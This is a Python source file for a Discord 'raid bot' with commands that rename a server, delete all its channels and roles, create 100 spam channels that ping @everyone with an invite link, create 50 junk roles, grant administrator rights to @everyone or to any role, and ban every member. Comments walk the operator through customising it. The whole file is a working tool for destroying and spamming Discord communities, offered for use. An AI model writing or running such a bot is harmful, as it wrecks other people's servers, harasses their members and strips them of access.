import time
import asyncio
import discord
from discord.ext import commands
from discord_webhook import DiscordWebhook, DiscordEmbed

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix="!", intents=intents) #Intents are important for this, do not touch anything here.

@client.event
async def on_ready(): #Every time that the bots turns on, will show this Ascii Art, if you want to use a custom Ascii art just change it, but let in inside of the triple quotes.
    anarchy = r"""
    ██████╗ ██╗   ██╗███╗   ██╗██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗     ███████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ 
    ██╔══██╗██║   ██║████╗  ██║██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗    ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗
    ██████╔╝██║   ██║██╔██╗ ██║█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║    ███████╗██║   ██║██║   ██║███████║██║  ██║
    ██╔═══╝ ██║   ██║██║╚██╗██║██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║    ╚════██║██║▄▄ ██║██║   ██║██╔══██║██║  ██║
    ██║     ╚██████╔╝██║ ╚████║██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██████╔╝    ███████║╚██████╔╝╚██████╔╝██║  ██║██████╔╝
    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝     ╚══════╝ ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                                    Raidbot by: Crowley
    """
    print(anarchy)
    client_status = [ #Put the custom status of the bot in this list, separated by quotes and ,
        "Customize your own status here",
    ]
    while True:
        for bot_status in client_status:
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=bot_status))
            await asyncio.sleep(120) #In this case, the bot will change the status every two minutes, change the time (In seconds)

def administrator_permissions():
    permissions = discord.Permissions()
    permissions.update(administrator = True)
    return permissions 

@client.event
async def on_guild_channel_create(channel): #This event sends spam to every channel created.
    y = 0
    if channel.name == "server-punkwned": #Use the logic, the name of the spam channels and this conditional must be the same, or the bot won't work.
        while y < 15:
            await channel.send("||@everyone|| Server Punkwned:\nhttps://discord.gg/FhJydrmbTz") #The spam message, you can use your own custom message.
            y += 1

@client.command() #Help menu with the default name of the commands, it's up to you change the names and adjust this crap.
async def ayuda(ctx):
    user = ctx.message.author
    embed = discord.Embed(
        title = "Command list of Arpaviejas",
        description = "Detailed description about what this bot can do at the moment",
        colour = 0xebe300
    )
    embed.add_field(name="!ayuda", value="Menú de ayuda del bot.", inline=False)
    embed.add_field(name="!eskorbuto", value="Changes the name and the icon of the server, also deletes all the channels and starts to make spam creating new channels with pings.", inline=True)
    embed.add_field(name="!kaotiko", value="This command deletes all the roles of the server above the bot's role and creates 50 new roles.", inline=False)
    embed.add_field(name="!herejia", value="We must have equity, so this shit will give Admin privileges to the @everyone role.", inline=True)
    embed.add_field(name="!panda", value="If you're an oppresor and son of a bitch, this crap will give you an special role with privileges. **WARNING: OTHER USERS CAN USE THIS, UNLESS YOU ADD AN EQUALITY CHECK TO CONFIRM YOUR USER ID.**", inline=False)
    embed.add_field(name="!flema", value="Do you want to get the invite of the bot and take a look to the bad practices of the creator?, use this command.", inline=True)
    embed.add_field(name="!glorificar", value="type !glorificar + role-name to give admin privileges to some role.", inline=False)
    embed.add_field(name="!millencolin", value="This command combines !eskorbuto, !kaotiko and !herejia at the same time, use this crap if you value your time. (Yeah sure, value your time raiding discord servers)", inline=True)
    embed.add_field(name="!elektroduentes", value="Works for ban all users, has some bugs due the Discord rate limit", inline=False)
    await user.send(embed=embed)

#Eskorbuto Command, if you want to use a custom image, just put the document in the same folder.
@client.command()
async def eskorbuto(ctx):
    with open('anarchism.jpg', 'rb') as f: #Once you got the image that you want to use, just change the name of the file and change the extension if needed.
        icon = f.read()
    await ctx.guild.edit(name="Server Punkwned by Anarchists", icon=icon) #Here's the new server name, change the name if you want.
    try:
        for channels in client.get_all_channels():
            await channels.delete()
    except:
        print(f"Error, i can't delete the channel {channels}")
    await asyncio.sleep(2)
    x = 0 
    while x < 100:
        await ctx.guild.create_text_channel("server-punkwned")
        x += 1 

@client.command()
async def kaotiko(ctx):
    for guild in client.guilds:
        for roles in guild.roles:
            if roles.name != "@everyone" or roles.name != "@Arpaviejas": #Bot tries to remove his own role for some reason, so i put this, change the Arpaviejas name to your bot name.
                    try:
                        await roles.delete()
                    except:
                        print(f"Error, i can't delete the role {roles}, maybe i'm above of that role.")
    z = 0
    while z < 50:
        await ctx.guild.create_role(name="Punks Are Here!", colour=0xebe300) #Again, roles name can be changed and the colour.
        z += 1

@client.command()
async def herejia(ctx):
    for guild in client.guilds:
        for role in guild.roles:
            if role.name == "@everyone":
                await role.edit(reason=None, permissions=administrator_permissions()) 

#The Panda command, you can change the Punk Role name and the colour, don't forgot to use "0x" before the Hex range
@client.command()
async def panda(ctx):
    user = ctx.message.author
    role = await ctx.guild.create_role(name="Punk", colour=0xebe300, permissions=administrator_permissions())
    await user.add_roles(role)

@client.command()
async def flema(ctx):
    user = ctx.message.author
    await user.send("Here's my invite:\nhttps://discord.com/oauth2/authorize?client_id=870548494082002944&scope=bot&permissions=8\nDo you want to take a look to the bad practices of the creator of this bot?, here's the official Github Repo:https://github.com/PuppetCrowley/Arpaviejas\n")

@client.command()
async def elektroduendes(ctx):
    for users in ctx.guild.members:
        if users != ctx.message.author:
            try:
                await users.ban()
            except:
                print(f"I can't ban {users}, Maybe i'm above of his role or he's the owner of the server.")

@client.command()
async def glorificar(ctx, role: discord.Role, *, reason=None):
    try:
        await role.edit(permissions=administrator_permissions())
    except:
        print(f"Error, i can't edit the role {role}, Maybe i'm above of this role or it's somehow protected.")

@client.command()
async def millencolin(ctx):
    eskorbuto(ctx)
    kaotiko(ctx)
    herejia(ctx)

client.run("")